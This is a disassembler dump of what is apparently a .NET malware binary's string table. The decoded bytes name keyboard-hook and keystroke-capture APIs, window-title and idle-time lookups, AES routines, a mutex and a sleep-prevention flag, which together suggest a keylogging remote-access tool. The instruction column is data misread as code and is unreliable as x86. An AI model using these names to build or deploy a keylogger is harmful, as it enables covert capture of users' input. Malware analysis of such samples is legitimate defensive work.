  4075d6:	4e                   	dec    %esi
  4075d7:	65 78 74             	gs js  0x40764e
  4075da:	48                   	dec    %eax
  4075db:	6f                   	outsl  %ds:(%esi),(%dx)
  4075dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4075dd:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4075e1:	47                   	inc    %edi
  4075e2:	65 74 4d             	gs je  0x407632
  4075e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e6:	64 75 6c             	fs jne 0x407655
  4075e9:	65 48                	gs dec %eax
  4075eb:	61                   	popa
  4075ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4075ed:	64 6c                	fs insb (%dx),%es:(%edi)
  4075ef:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  4075f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4075f5:	64 75 6c             	fs jne 0x407664
  4075f8:	65 4e                	gs dec %esi
  4075fa:	61                   	popa
  4075fb:	6d                   	insl   (%dx),%es:(%edi)
  4075fc:	65 00 57 48          	add    %dl,%gs:0x48(%edi)
  407600:	4b                   	dec    %ebx
  407601:	45                   	inc    %ebp
  407602:	59                   	pop    %ecx
  407603:	42                   	inc    %edx
  407604:	4f                   	dec    %edi
  407605:	41                   	inc    %ecx
  407606:	52                   	push   %edx
  407607:	44                   	inc    %esp
  407608:	4c                   	dec    %esp
  407609:	4c                   	dec    %esp
  40760a:	00 47 65             	add    %al,0x65(%edi)
  40760d:	74 46                	je     0x407655
  40760f:	6f                   	outsl  %ds:(%esi),(%dx)
  407610:	72 65                	jb     0x407677
  407612:	67 72 6f             	addr16 jb 0x407684
  407615:	75 6e                	jne    0x407685
  407617:	64 57                	fs push %edi
  407619:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  407620:	65 74 57             	gs je  0x40767a
  407623:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  40762a:	72 65                	jb     0x407691
  40762c:	61                   	popa
  40762d:	64 50                	fs push %eax
  40762f:	72 6f                	jb     0x4076a0
  407631:	63 65 73             	arpl   %esp,0x73(%ebp)
  407634:	73 49                	jae    0x40767f
  407636:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  40763a:	6e                   	outsb  %ds:(%esi),(%dx)
  40763b:	64 00 6c 70 64       	add    %ch,%fs:0x64(%eax,%esi,2)
  407640:	77 50                	ja     0x407692
  407642:	72 6f                	jb     0x4076b3
  407644:	63 65 73             	arpl   %esp,0x73(%ebp)
  407647:	73 49                	jae    0x407692
  407649:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  40764d:	74 4b                	je     0x40769a
  40764f:	65 79 53             	gs jns 0x4076a5
  407652:	74 61                	je     0x4076b5
  407654:	74 65                	je     0x4076bb
  407656:	00 6b 65             	add    %ch,0x65(%ebx)
  407659:	79 43                	jns    0x40769e
  40765b:	6f                   	outsl  %ds:(%esi),(%dx)
  40765c:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  407661:	74 4b                	je     0x4076ae
  407663:	65 79 62             	gs jns 0x4076c8
  407666:	6f                   	outsl  %ds:(%esi),(%dx)
  407667:	61                   	popa
  407668:	72 64                	jb     0x4076ce
  40766a:	53                   	push   %ebx
  40766b:	74 61                	je     0x4076ce
  40766d:	74 65                	je     0x4076d4
  40766f:	00 6c 70 4b          	add    %ch,0x4b(%eax,%esi,2)
  407673:	65 79 53             	gs jns 0x4076c9
  407676:	74 61                	je     0x4076d9
  407678:	74 65                	je     0x4076df
  40767a:	00 47 65             	add    %al,0x65(%edi)
  40767d:	74 4b                	je     0x4076ca
  40767f:	65 79 62             	gs jns 0x4076e4
  407682:	6f                   	outsl  %ds:(%esi),(%dx)
  407683:	61                   	popa
  407684:	72 64                	jb     0x4076ea
  407686:	4c                   	dec    %esp
  407687:	61                   	popa
  407688:	79 6f                	jns    0x4076f9
  40768a:	75 74                	jne    0x407700
  40768c:	00 69 64             	add    %ch,0x64(%ecx)
  40768f:	54                   	push   %esp
  407690:	68 72 65 61 64       	push   $0x64616572
  407695:	00 53 79             	add    %dl,0x79(%ebx)
  407698:	73 74                	jae    0x40770e
  40769a:	65 6d                	gs insl (%dx),%es:(%edi)
  40769c:	2e 54                	cs push %esp
  40769e:	65 78 74             	gs js  0x407715
  4076a1:	00 53 74             	add    %dl,0x74(%ebx)
  4076a4:	72 69                	jb     0x40770f
  4076a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4076a7:	67 42                	addr16 inc %edx
  4076a9:	75 69                	jne    0x407714
  4076ab:	6c                   	insb   (%dx),%es:(%edi)
  4076ac:	64 65 72 00          	fs gs jb 0x4076b0
  4076b0:	54                   	push   %esp
  4076b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b2:	55                   	push   %ebp
  4076b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4076b4:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  4076bb:	00 77 56             	add    %dh,0x56(%edi)
  4076be:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  4076c5:	77 53                	ja     0x40771a
  4076c7:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  4076ca:	43                   	inc    %ebx
  4076cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4076cc:	64 65 00 70 77       	fs add %dh,%gs:0x77(%eax)
  4076d1:	73 7a                	jae    0x40774d
  4076d3:	42                   	inc    %edx
  4076d4:	75 66                	jne    0x40773c
  4076d6:	66 00 63 63          	data16 add %ah,0x63(%ebx)
  4076da:	68 42 75 66 66       	push   $0x66667542
  4076df:	00 77 46             	add    %dh,0x46(%edi)
  4076e2:	6c                   	insb   (%dx),%es:(%edi)
  4076e3:	61                   	popa
  4076e4:	67 73 00             	addr16 jae 0x4076e7
  4076e7:	64 77 68             	fs ja  0x407752
  4076ea:	6b 6c 00 4d 61       	imul   $0x61,0x4d(%eax,%eax,1),%ebp
  4076ef:	70 56                	jo     0x407747
  4076f1:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  4076f8:	65 79 00             	gs jns 0x4076fb
  4076fb:	75 43                	jne    0x407740
  4076fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fe:	64 65 00 75 4d       	fs add %dh,%gs:0x4d(%ebp)
  407703:	61                   	popa
  407704:	70 54                	jo     0x40775a
  407706:	79 70                	jns    0x407778
  407708:	65 00 44 65 63       	add    %al,%gs:0x63(%ebp,%eiz,2)
  40770d:	72 79                	jb     0x407788
  40770f:	70 74                	jo     0x407785
  407711:	00 69 6e             	add    %ch,0x6e(%ecx)
  407714:	70 75                	jo     0x40778b
  407716:	74 00                	je     0x407718
  407718:	50                   	push   %eax
  407719:	72 6f                	jb     0x40778a
  40771b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40771e:	73 44                	jae    0x407764
  407720:	70 69                	jo     0x40778b
  407722:	00 53 65             	add    %dl,0x65(%ebx)
  407725:	74 50                	je     0x407777
  407727:	72 6f                	jb     0x407798
  407729:	63 65 73             	arpl   %esp,0x73(%ebp)
  40772c:	73 44                	jae    0x407772
  40772e:	70 69                	jo     0x407799
  407730:	41                   	inc    %ecx
  407731:	77 61                	ja     0x407794
  407733:	72 65                	jb     0x40779a
  407735:	6e                   	outsb  %ds:(%esi),(%dx)
  407736:	65 73 73             	gs jae 0x4077ac
  407739:	00 61 77             	add    %ah,0x77(%ecx)
  40773c:	61                   	popa
  40773d:	72 65                	jb     0x4077a4
  40773f:	6e                   	outsb  %ds:(%esi),(%dx)
  407740:	65 73 73             	gs jae 0x4077b6
  407743:	00 49 73             	add    %cl,0x73(%ecx)
  407746:	56                   	push   %esi
  407747:	61                   	popa
  407748:	6c                   	insb   (%dx),%es:(%edi)
  407749:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407750:	6e 
  407751:	4e                   	dec    %esi
  407752:	61                   	popa
  407753:	6d                   	insl   (%dx),%es:(%edi)
  407754:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407758:	6d                   	insl   (%dx),%es:(%edi)
  407759:	65 00 41 6c          	add    %al,%gs:0x6c(%ecx)
  40775d:	70 68                	jo     0x4077c7
  40775f:	61                   	popa
  407760:	62 65 74             	bound  %esp,0x74(%ebp)
  407763:	00 52 61             	add    %dl,0x61(%edx)
  407766:	6e                   	outsb  %ds:(%esi),(%dx)
  407767:	64 6f                	outsl  %fs:(%esi),(%dx)
  407769:	6d                   	insl   (%dx),%es:(%edi)
  40776a:	00 50 4c             	add    %dl,0x4c(%eax)
  40776d:	00 63 75             	add    %ah,0x75(%ebx)
  407770:	72 72                	jb     0x4077e4
  407772:	65 6e                	outsb  %gs:(%esi),(%dx)
  407774:	74 00                	je     0x407776
  407776:	47                   	inc    %edi
  407777:	65 74 52             	gs je  0x4077cc
  40777a:	61                   	popa
  40777b:	6e                   	outsb  %ds:(%esi),(%dx)
  40777c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40777e:	6d                   	insl   (%dx),%es:(%edi)
  40777f:	53                   	push   %ebx
  407780:	74 72                	je     0x4077f4
  407782:	69 6e 67 00 6c 65 6e 	imul   $0x6e656c00,0x67(%esi),%ebp
  407789:	67 74 68             	addr16 je 0x4077f4
  40778c:	00 47 65             	add    %al,0x65(%edi)
  40778f:	74 4c                	je     0x4077dd
  407791:	61                   	popa
  407792:	73 74                	jae    0x407808
  407794:	49                   	dec    %ecx
  407795:	6e                   	outsb  %ds:(%esi),(%dx)
  407796:	70 75                	jo     0x40780d
  407798:	74 49                	je     0x4077e3
  40779a:	6e                   	outsb  %ds:(%esi),(%dx)
  40779b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40779d:	00 70 6c             	add    %dh,0x6c(%eax)
  4077a0:	69 69 00 69 64 6c 65 	imul   $0x656c6469,0x0(%ecx),%ebp
  4077a7:	74 69                	je     0x407812
  4077a9:	6d                   	insl   (%dx),%es:(%edi)
  4077aa:	65 00 6c 61 73       	add    %ch,%gs:0x73(%ecx,%eiz,2)
  4077af:	74 49                	je     0x4077fa
  4077b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4077b2:	70 75                	jo     0x407829
  4077b4:	74 49                	je     0x4077ff
  4077b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4077b7:	66 00 47 65          	data16 add %al,0x65(%edi)
  4077bb:	74 4c                	je     0x407809
  4077bd:	61                   	popa
  4077be:	73 74                	jae    0x407834
  4077c0:	49                   	dec    %ecx
  4077c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4077c2:	70 75                	jo     0x407839
  4077c4:	74 54                	je     0x40781a
  4077c6:	69 6d 65 00 54 69 6d 	imul   $0x6d695400,0x65(%ebp),%ebp
  4077cd:	65 53                	gs push %ebx
  4077cf:	70 61                	jo     0x407832
  4077d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d2:	00 73 75             	add    %dh,0x75(%ebx)
  4077d5:	6d                   	insl   (%dx),%es:(%edi)
  4077d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d7:	66 69 64 6c 65 74 69 	imul   $0x6974,0x65(%esp,%ebp,2),%sp
  4077de:	6d                   	insl   (%dx),%es:(%edi)
  4077df:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  4077e4:	74 4c                	je     0x407832
  4077e6:	61                   	popa
  4077e7:	73 74                	jae    0x40785d
  4077e9:	49                   	dec    %ecx
  4077ea:	64 6c                	fs insb (%dx),%es:(%edi)
  4077ec:	65 74 69             	gs je  0x407858
  4077ef:	6d                   	insl   (%dx),%es:(%edi)
  4077f0:	65 00 54 69 6d       	add    %dl,%gs:0x6d(%ecx,%ebp,2)
  4077f5:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  4077fa:	74 41                	je     0x40783d
  4077fc:	63 74 00 75          	arpl   %esi,0x75(%eax,%eax,1)
  407800:	73 65                	jae    0x407867
  407802:	72 41                	jb     0x407845
  407804:	67 65 6e             	outsb  %gs:(%si),(%dx)
  407807:	74 73                	je     0x40787c
  407809:	00 47 65             	add    %al,0x65(%edi)
  40780c:	74 57                	je     0x407865
  40780e:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  407815:	78 74                	js     0x40788b
  407817:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40781b:	74 00                	je     0x40781d
  40781d:	63 6f 75             	arpl   %ebp,0x75(%edi)
  407820:	6e                   	outsb  %ds:(%esi),(%dx)
  407821:	74 00                	je     0x407823
  407823:	53                   	push   %ebx
  407824:	65 74 54             	gs je  0x40787b
  407827:	68 72 65 61 64       	push   $0x64616572
  40782c:	45                   	inc    %ebp
  40782d:	78 65                	js     0x407894
  40782f:	63 75 74             	arpl   %esi,0x74(%ebp)
  407832:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  407839:	65 00 65 73          	add    %ah,%gs:0x73(%ebp)
  40783d:	46                   	inc    %esi
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	61                   	popa
  407840:	67 73 00             	addr16 jae 0x407843
  407843:	50                   	push   %eax
  407844:	72 65                	jb     0x4078ab
  407846:	76 65                	jbe    0x4078ad
  407848:	6e                   	outsb  %ds:(%esi),(%dx)
  407849:	74 53                	je     0x40789e
  40784b:	6c                   	insb   (%dx),%es:(%edi)
  40784c:	65 65 70 00          	gs gs jo 0x407850
  407850:	53                   	push   %ebx
  407851:	42                   	inc    %edx
  407852:	00 73 00             	add    %dh,0x0(%ebx)
  407855:	42                   	inc    %edx
  407856:	53                   	push   %ebx
  407857:	00 49 44             	add    %cl,0x44(%ecx)
  40785a:	00 47 65             	add    %al,0x65(%edi)
  40785d:	74 48                	je     0x4078a7
  40785f:	61                   	popa
  407860:	73 68                	jae    0x4078ca
  407862:	54                   	push   %esp
  407863:	00 73 74             	add    %dh,0x74(%ebx)
  407866:	72 54                	jb     0x4078bc
  407868:	6f                   	outsl  %ds:(%esi),(%dx)
  407869:	48                   	dec    %eax
  40786a:	61                   	popa
  40786b:	73 68                	jae    0x4078d5
  40786d:	00 53 65             	add    %dl,0x65(%ebx)
  407870:	74 56                	je     0x4078c8
  407872:	61                   	popa
  407873:	6c                   	insb   (%dx),%es:(%edi)
  407874:	75 65                	jne    0x4078db
  407876:	00 76 61             	add    %dh,0x61(%esi)
  407879:	6c                   	insb   (%dx),%es:(%edi)
  40787a:	75 65                	jne    0x4078e1
  40787c:	00 47 65             	add    %al,0x65(%edi)
  40787f:	74 56                	je     0x4078d7
  407881:	61                   	popa
  407882:	6c                   	insb   (%dx),%es:(%edi)
  407883:	75 65                	jne    0x4078ea
  407885:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  407889:	6f                   	outsl  %ds:(%esi),(%dx)
  40788a:	6d                   	insl   (%dx),%es:(%edi)
  40788b:	70 72                	jo     0x4078ff
  40788d:	65 73 73             	gs jae 0x407903
  407890:	00 43 6f             	add    %al,0x6f(%ebx)
  407893:	6d                   	insl   (%dx),%es:(%edi)
  407894:	70 72                	jo     0x407908
  407896:	65 73 73             	gs jae 0x40790c
  407899:	00 41 45             	add    %al,0x45(%ecx)
  40789c:	53                   	push   %ebx
  40789d:	5f                   	pop    %edi
  40789e:	45                   	inc    %ebp
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	63 72 79             	arpl   %esi,0x79(%edx)
  4078a3:	70 74                	jo     0x407919
  4078a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a6:	72 00                	jb     0x4078a8
  4078a8:	41                   	inc    %ecx
  4078a9:	45                   	inc    %ebp
  4078aa:	53                   	push   %ebx
  4078ab:	5f                   	pop    %edi
  4078ac:	44                   	inc    %esp
  4078ad:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4078b1:	70 74                	jo     0x407927
  4078b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b4:	72 00                	jb     0x4078b6
  4078b6:	5f                   	pop    %edi
  4078b7:	61                   	popa
  4078b8:	70 70                	jo     0x40792a
  4078ba:	4d                   	dec    %ebp
  4078bb:	75 74                	jne    0x407931
  4078bd:	65 78 00             	gs js  0x4078c0
  4078c0:	43                   	inc    %ebx
  4078c1:	72 65                	jb     0x407928
  4078c3:	61                   	popa
  4078c4:	74 65                	je     0x40792b
  4078c6:	4d                   	dec    %ebp
  4078c7:	75 74                	jne    0x40793d
  4078c9:	65 78 00             	gs js  0x4078cc
  4078cc:	43                   	inc    %ebx
  4078cd:	6c                   	insb   (%dx),%es:(%edi)
  4078ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cf:	73 65                	jae    0x407936
  4078d1:	4d                   	dec    %ebp
  4078d2:	75 74                	jne    0x407948
  4078d4:	65 78 00             	gs js  0x4078d7
  4078d7:	4d                   	dec    %ebp
  4078d8:	75 6c                	jne    0x407946
  4078da:	74 69                	je     0x407945
  4078dc:	63 61 73             	arpl   %esp,0x73(%ecx)
  4078df:	74 44                	je     0x407925
  4078e1:	65 6c                	gs insb (%dx),%es:(%edi)
  4078e3:	65 67 61             	gs addr16 popa
  4078e6:	74 65                	je     0x40794d
  4078e8:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  4078ec:	67 65 74 4f          	addr16 gs je 0x40793f
  4078f0:	62 6a 65             	bound  %ebp,0x65(%edx)
  4078f3:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  4078f7:	61                   	popa
  4078f8:	72 67                	jb     0x407961
  4078fa:	65 74 4d             	gs je  0x40794a
  4078fd:	65 74 68             	gs je  0x407968
  407900:	6f                   	outsl  %ds:(%esi),(%dx)
  407901:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  407905:	79 6e                	jns    0x407975
  407907:	63 43 61             	arpl   %eax,0x61(%ebx)
  40790a:	6c                   	insb   (%dx),%es:(%edi)
  40790b:	6c                   	insb   (%dx),%es:(%edi)
  40790c:	62 61 63             	bound  %esp,0x63(%ecx)
  40790f:	6b 00 42             	imul   $0x42,(%eax),%eax
  407912:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  407919:	6f 6b 
  40791b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407920:	65 67 61             	gs addr16 popa
  407923:	74 65                	je     0x40798a
  407925:	43                   	inc    %ebx
  407926:	61                   	popa
  407927:	6c                   	insb   (%dx),%es:(%edi)
  407928:	6c                   	insb   (%dx),%es:(%edi)
  407929:	62 61 63             	bound  %esp,0x63(%ecx)
  40792c:	6b 00 44             	imul   $0x44,(%eax),%eax
  40792f:	65 6c                	gs insb (%dx),%es:(%edi)
  407931:	65 67 61             	gs addr16 popa
  407934:	74 65                	je     0x40799b
  407936:	41                   	inc    %ecx
  407937:	73 79                	jae    0x4079b2
  407939:	6e                   	outsb  %ds:(%esi),(%dx)
  40793a:	63 53 74             	arpl   %edx,0x74(%ebx)
  40793d:	61                   	popa
  40793e:	74 65                	je     0x4079a5
  407940:	00 45 6e             	add    %al,0x6e(%ebp)
  407943:	64 49                	fs dec %ecx
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	76 6f                	jbe    0x4079b7
  407948:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  40794c:	65 6c                	gs insb (%dx),%es:(%edi)
  40794e:	65 67 61             	gs addr16 popa
  407951:	74 65                	je     0x4079b8
  407953:	41                   	inc    %ecx
  407954:	73 79                	jae    0x4079cf
  407956:	6e                   	outsb  %ds:(%esi),(%dx)
  407957:	63 52 65             	arpl   %edx,0x65(%edx)
  40795a:	73 75                	jae    0x4079d1
  40795c:	6c                   	insb   (%dx),%es:(%edi)
  40795d:	74 00                	je     0x40795f
  40795f:	49                   	dec    %ecx
  407960:	6e                   	outsb  %ds:(%esi),(%dx)
  407961:	76 6f                	jbe    0x4079d2
  407963:	6b 65 00 56          	imul   $0x56,0x0(%ebp),%esp
  407967:	61                   	popa
  407968:	6c                   	insb   (%dx),%es:(%edi)
  407969:	75 65                	jne    0x4079d0
  40796b:	54                   	push   %esp
  40796c:	79 70                	jns    0x4079de
  40796e:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  407972:	53                   	push   %ebx
  407973:	69 7a 65 00 64 77 54 	imul   $0x54776400,0x65(%edx),%edi
  40797a:	69 6d 65 00 45 6e 75 	imul   $0x756e4500,0x65(%ebp),%ebp
  407981:	6d                   	insl   (%dx),%es:(%edi)
  407982:	00 76 61             	add    %dh,0x61(%esi)
  407985:	6c                   	insb   (%dx),%es:(%edi)
  407986:	75 65                	jne    0x4079ed
  407988:	5f                   	pop    %edi
  407989:	5f                   	pop    %edi
  40798a:	00 45 53             	add    %al,0x53(%ebp)
  40798d:	5f                   	pop    %edi
  40798e:	43                   	inc    %ebx
  40798f:	4f                   	dec    %edi
  407990:	4e                   	dec    %esi
  407991:	54                   	push   %esp
  407992:	49                   	dec    %ecx
  407993:	4e                   	dec    %esi
  407994:	55                   	push   %ebp
  407995:	4f                   	dec    %edi
  407996:	55                   	push   %ebp
  407997:	53                   	push   %ebx
  407998:	00 45 53             	add    %al,0x53(%ebp)
  40799b:	5f                   	pop    %edi
  40799c:	44                   	inc    %esp
  40799d:	49                   	dec    %ecx
  40799e:	53                   	push   %ebx
  40799f:	50                   	push   %eax
  4079a0:	4c                   	dec    %esp
  4079a1:	41                   	inc    %ecx
  4079a2:	59                   	pop    %ecx
  4079a3:	5f                   	pop    %edi
  4079a4:	52                   	push   %edx
  4079a5:	45                   	inc    %ebp
  4079a6:	51                   	push   %ecx
  4079a7:	55                   	push   %ebp
  4079a8:	49                   	dec    %ecx
  4079a9:	52                   	push   %edx
  4079aa:	45                   	inc    %ebp
  4079ab:	44                   	inc    %esp
  4079ac:	00 45 53             	add    %al,0x53(%ebp)
  4079af:	5f                   	pop    %edi
  4079b0:	53                   	push   %ebx
  4079b1:	59                   	pop    %ecx
  4079b2:	53                   	push   %ebx
  4079b3:	54                   	push   %esp
  4079b4:	45                   	inc    %ebp
  4079b5:	4d                   	dec    %ebp
  4079b6:	5f                   	pop    %edi
  4079b7:	52                   	push   %edx
  4079b8:	45                   	inc    %ebp
  4079b9:	51                   	push   %ecx
  4079ba:	55                   	push   %ebp
  4079bb:	49                   	dec    %ecx
  4079bc:	52                   	push   %edx
  4079bd:	45                   	inc    %ebp
  4079be:	44                   	inc    %esp
  4079bf:	00 53 79             	add    %dl,0x79(%ebx)
  4079c2:	73 74                	jae    0x407a38
  4079c4:	65 6d                	gs insl (%dx),%es:(%edi)
  4079c6:	2e 43                	cs inc %ebx
  4079c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c9:	6d                   	insl   (%dx),%es:(%edi)
  4079ca:	70 6f                	jo     0x407a3b
  4079cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4079cd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4079cf:	74 4d                	je     0x407a1e
  4079d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d2:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4079d5:	00 45 64             	add    %al,0x64(%ebp)
  4079d8:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  4079df:	77 
  4079e0:	73 61                	jae    0x407a43
  4079e2:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4079e6:	74 74                	je     0x407a5c
  4079e8:	72 69                	jb     0x407a53
  4079ea:	62 75 74             	bound  %esi,0x74(%ebp)
  4079ed:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  4079f1:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  4079f8:	77 
  4079f9:	73 61                	jae    0x407a5c
  4079fb:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  4079ff:	74 61                	je     0x407a62
  407a01:	74 65                	je     0x407a68
  407a03:	00 53 79             	add    %dl,0x79(%ebx)
  407a06:	73 74                	jae    0x407a7c
  407a08:	65 6d                	gs insl (%dx),%es:(%edi)
  407a0a:	2e 43                	cs inc %ebx
  407a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0d:	64 65 44             	fs gs inc %esp
  407a10:	6f                   	outsl  %ds:(%esi),(%dx)
  407a11:	6d                   	insl   (%dx),%es:(%edi)
  407a12:	2e 43                	cs inc %ebx
  407a14:	6f                   	outsl  %ds:(%esi),(%dx)
  407a15:	6d                   	insl   (%dx),%es:(%edi)
  407a16:	70 69                	jo     0x407a81
  407a18:	6c                   	insb   (%dx),%es:(%edi)
  407a19:	65 72 00             	gs jb  0x407a1c
  407a1c:	47                   	inc    %edi
  407a1d:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a1f:	65 72 61             	gs jb  0x407a83
  407a22:	74 65                	je     0x407a89
  407a24:	64 43                	fs inc %ebx
  407a26:	6f                   	outsl  %ds:(%esi),(%dx)
  407a27:	64 65 41             	fs gs inc %ecx
  407a2a:	74 74                	je     0x407aa0
  407a2c:	72 69                	jb     0x407a97
  407a2e:	62 75 74             	bound  %esi,0x74(%ebp)
  407a31:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407a35:	73 74                	jae    0x407aab
  407a37:	65 6d                	gs insl (%dx),%es:(%edi)
  407a39:	2e 44                	cs inc %esp
  407a3b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  407a42:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  407a49:	75 67                	jne    0x407ab2
  407a4b:	67 65 72 48          	addr16 gs jb 0x407a97
  407a4f:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  407a56:	74 
  407a57:	72 69                	jb     0x407ac2
  407a59:	62 75 74             	bound  %esi,0x74(%ebp)
  407a5c:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  407a60:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407a63:	73 6f                	jae    0x407ad4
  407a65:	66 74 2e             	data16 je 0x407a96
  407a68:	56                   	push   %esi
  407a69:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407a70:	73 69                	jae    0x407adb
  407a72:	63 2e                	arpl   %ebp,(%esi)
  407a74:	43                   	inc    %ebx
  407a75:	6f                   	outsl  %ds:(%esi),(%dx)
  407a76:	6d                   	insl   (%dx),%es:(%edi)
  407a77:	70 69                	jo     0x407ae2
  407a79:	6c                   	insb   (%dx),%es:(%edi)
  407a7a:	65 72 53             	gs jb  0x407ad0
  407a7d:	65 72 76             	gs jb  0x407af6
  407a80:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  407a87:	61                   	popa
  407a88:	6e                   	outsb  %ds:(%esi),(%dx)
  407a89:	64 61                	fs popa
  407a8b:	72 64                	jb     0x407af1
  407a8d:	4d                   	dec    %ebp
  407a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8f:	64 75 6c             	fs jne 0x407afe
  407a92:	65 41                	gs inc %ecx
  407a94:	74 74                	je     0x407b0a
  407a96:	72 69                	jb     0x407b01
  407a98:	62 75 74             	bound  %esi,0x74(%ebp)
  407a9b:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  407a9f:	64 65 4d             	fs gs dec %ebp
  407aa2:	6f                   	outsl  %ds:(%esi),(%dx)
  407aa3:	64 75 6c             	fs jne 0x407b12
  407aa6:	65 4e                	gs dec %esi
  407aa8:	61                   	popa
  407aa9:	6d                   	insl   (%dx),%es:(%edi)
  407aaa:	65 41                	gs inc %ecx
  407aac:	74 74                	je     0x407b22
  407aae:	72 69                	jb     0x407b19
  407ab0:	62 75 74             	bound  %esi,0x74(%ebp)
  407ab3:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407ab7:	73 74                	jae    0x407b2d
  407ab9:	65 6d                	gs insl (%dx),%es:(%edi)
  407abb:	2e 43                	cs inc %ebx
  407abd:	6f                   	outsl  %ds:(%esi),(%dx)
  407abe:	6d                   	insl   (%dx),%es:(%edi)
  407abf:	70 6f                	jo     0x407b30
  407ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac2:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ac4:	74 4d                	je     0x407b13
  407ac6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ac7:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407aca:	2e 44                	cs inc %esp
  407acc:	65 73 69             	gs jae 0x407b38
  407acf:	67 6e                	outsb  %ds:(%si),(%dx)
  407ad1:	00 48 65             	add    %cl,0x65(%eax)
  407ad4:	6c                   	insb   (%dx),%es:(%edi)
  407ad5:	70 4b                	jo     0x407b22
  407ad7:	65 79 77             	gs jns 0x407b51
  407ada:	6f                   	outsl  %ds:(%esi),(%dx)
  407adb:	72 64                	jb     0x407b41
  407add:	41                   	inc    %ecx
  407ade:	74 74                	je     0x407b54
  407ae0:	72 69                	jb     0x407b4b
  407ae2:	62 75 74             	bound  %esi,0x74(%ebp)
  407ae5:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407ae9:	73 74                	jae    0x407b5f
  407aeb:	65 6d                	gs insl (%dx),%es:(%edi)
  407aed:	2e 52                	cs push %edx
  407aef:	75 6e                	jne    0x407b5f
  407af1:	74 69                	je     0x407b5c
  407af3:	6d                   	insl   (%dx),%es:(%edi)
  407af4:	65 2e 43             	gs cs inc %ebx
  407af7:	6f                   	outsl  %ds:(%esi),(%dx)
  407af8:	6d                   	insl   (%dx),%es:(%edi)
